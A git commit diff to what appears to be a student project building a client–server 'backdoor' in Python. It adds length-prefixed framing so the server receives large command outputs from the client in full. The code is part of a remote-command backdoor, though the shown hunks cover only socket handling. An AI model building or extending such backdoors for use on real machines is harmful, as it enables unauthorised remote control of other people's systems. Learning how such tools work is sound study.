e016283fae0ffe45be341a62f980329af0f17c96
unknown <kaborejbaime@gmail.com>
2026-04-19 18:19:16 +0200

    Problème de la réponse trop grande

--- Projet/backdoor_client.py
+++ Projet/backdoor_client.py
@@ -31,7 +31,20 @@ while True:
 
     if not reponse or len(reponse) == 0:
         reponse = " "
+
+    # HEADER 13 octets -> longeur data
+    # DATA (longeur) octets
+
+    # HEADER 0000000003173
+    # DATA 3173 octets
+
+    # 1000000000000   13 octets
+    
+    header = str(len(reponse.encode())).zfill(13)
+    print("header:", header)
+    s.sendall(header.encode())
     s.sendall(reponse.encode())
     
+    # handshake
 
 s.close()
--- Projet/backdoor_serveur.py
+++ Projet/backdoor_serveur.py
@@ -14,6 +14,26 @@ HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
+def socket_receive_all_data(socket_p, data_len):
+    current_data_len = 0
+    total_data = None
+    print("socket_receive_all_data len:", data_len)
+    while current_data_len < data_len:
+        chunk_len = data_len - current_data_len
+        if chunk_len > MAX_DATA_SIZE:
+            chunk_len = MAX_DATA_SIZE
+        data = socket_p.recv(chunk_len)
+        print("  len:", len(data))
+        if not data:
+            return None
+        if not total_data:
+            total_data = data
+        else:
+            total_data += data
+        current_data_len += len(data)
+        print("  total len:", current_data_len, "/", data_len)
+    return total_data
+
 s = socket.socket()
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST_IP, HOST_PORT))
@@ -28,9 +48,15 @@ while True:
     if commande == "":
         continue
     connection_socket.sendall(commande.encode())
-    data_recues = connection_socket.recv(MAX_DATA_SIZE)
+
+    header_data = socket_receive_all_data(connection_socket, 13)
+    longeur_data = int(header_data.decode())
+
+    print("longeur_data:", longeur_data)
+    data_recues = socket_receive_all_data(connection_socket, longeur_data)
     if not data_recues:
         break
+    print("data_recues longueur:", len(data_recues))
     print(data_recues.decode())
 
 s.close()
